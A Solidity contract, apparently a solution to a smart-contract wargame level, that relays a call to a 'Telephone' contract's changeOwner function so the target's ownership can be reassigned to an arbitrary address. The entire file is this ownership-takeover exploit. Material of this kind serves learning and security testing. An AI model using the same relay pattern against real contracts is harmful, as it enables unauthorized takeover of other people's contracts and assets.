// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract Call {
    Telephone private immutable telephone;
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function callToChangeOwner(address newOwner) external {
        telephone.changeOwner(newOwner);
    }

    function getOwner() external view returns(address) {
        return telephone.owner();
    }
}
